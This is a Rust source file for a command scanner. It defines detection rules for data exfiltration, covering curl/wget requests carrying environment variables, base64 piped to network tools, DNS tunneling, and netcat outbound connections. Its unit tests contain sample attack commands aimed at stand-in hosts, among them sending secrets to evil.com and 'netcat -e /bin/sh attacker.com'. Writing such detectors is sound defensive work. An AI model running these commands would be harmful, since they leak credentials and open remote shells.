use crate::rules::types::{Category, Rule, Severity};
use regex::Regex;

pub fn rules() -> Vec<Rule> {
    vec![ex_001(), ex_002(), ex_003(), ex_005()]
}

fn ex_001() -> Rule {
    Rule {
        id: "EX-001",
        name: "Network request with environment variable",
        description: "Detects curl/wget commands that include environment variables, potentially exfiltrating sensitive data",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        patterns: vec![
            Regex::new(r"(curl|wget)\s+.*\$[A-Z_][A-Z0-9_]*").unwrap(),
            Regex::new(r"(curl|wget)\s+.*\$\{[A-Z_][A-Z0-9_]*\}").unwrap(),
        ],
        exclusions: vec![Regex::new(r"localhost|127\.0\.0\.1|::1|\[::1\]").unwrap()],
        message: "Potential data exfiltration: network request with environment variable detected",
        recommendation: "Review the command and ensure no sensitive data is being sent externally",
    }
}

fn ex_002() -> Rule {
    Rule {
        id: "EX-002",
        name: "Base64 encoded network transmission",
        description: "Detects base64 encoding combined with network transmission, often used to obfuscate data exfiltration",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        patterns: vec![
            Regex::new(r"base64.*\|\s*(curl|wget|nc|netcat)").unwrap(),
            Regex::new(r"(curl|wget|nc|netcat).*base64").unwrap(),
            Regex::new(r"base64.*https?://").unwrap(),
        ],
        exclusions: vec![Regex::new(r"localhost|127\.0\.0\.1|::1").unwrap()],
        message: "Potential data exfiltration: base64 encoding with network transmission detected",
        recommendation: "Investigate why data is being base64 encoded before network transmission",
    }
}

fn ex_003() -> Rule {
    Rule {
        id: "EX-003",
        name: "DNS-based data exfiltration",
        description: "Detects DNS queries that may be used for data exfiltration (DNS tunneling)",
        severity: Severity::High,
        category: Category::Exfiltration,
        patterns: vec![
            // dig/nslookup with variable data in subdomain
            Regex::new(r"\b(dig|nslookup|host)\s+.*\$").unwrap(),
            // Common DNS exfil patterns
            Regex::new(r"\$\([^)]+\)\.[a-zA-Z0-9-]+\.(com|net|org|io)\b").unwrap(),
            // ping with variable subdomain
            Regex::new(r"ping\s+.*\$[A-Z_][A-Z0-9_]*.*\.").unwrap(),
        ],
        exclusions: vec![],
        message: "Potential DNS-based data exfiltration: data encoded in DNS query detected",
        recommendation: "Review DNS queries and ensure they are not being used to exfiltrate data",
    }
}

fn ex_005() -> Rule {
    Rule {
        id: "EX-005",
        name: "Netcat outbound connection",
        description: "Detects netcat (nc) commands that may establish outbound connections for data exfiltration",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        patterns: vec![
            Regex::new(r"\b(nc|netcat)\s+(-[a-zA-Z]*\s+)*[a-zA-Z0-9.-]+\s+\d+").unwrap(),
            Regex::new(r"\b(nc|netcat)\s+.*-e").unwrap(),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1|::1").unwrap(),
            Regex::new(r"-l\s").unwrap(), // listening mode is less suspicious
        ],
        message: "Potential data exfiltration: netcat outbound connection detected",
        recommendation: "Review the netcat usage and ensure it's not being used for data exfiltration",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ex_001_detects_curl_with_env() {
        let rule = ex_001();
        let test_cases = vec![
            (r#"curl https://evil.com?key=$API_KEY"#, true),
            (r#"curl -d "$SECRET" https://attacker.com"#, true),
            (r#"wget https://evil.com/$HOME"#, true),
            (r#"curl http://localhost:3000"#, false),
            (r#"curl https://api.github.com"#, false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_002_detects_base64_network() {
        let rule = ex_002();
        let test_cases = vec![
            (
                "cat secret.txt | base64 | curl -d @- https://evil.com",
                true,
            ),
            ("curl https://example.com | base64", true),
            ("base64 file.txt", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            assert_eq!(matched, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_003_detects_dns_exfil() {
        let rule = ex_003();
        let test_cases = vec![
            ("dig $DATA.evil.com", true),
            ("nslookup $SECRET.attacker.io", true),
            ("host $ENCODED.malicious.net", true),
            ("ping $TOKEN.evil.org", true),
            ("dig example.com", false),
            ("nslookup google.com", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            assert_eq!(matched, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_005_detects_netcat() {
        let rule = ex_005();
        let test_cases = vec![
            ("nc evil.com 4444", true),
            ("netcat -e /bin/sh attacker.com 1234", true),
            ("nc -l 8080", false), // listening mode excluded
            ("nc localhost 3000", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }
}
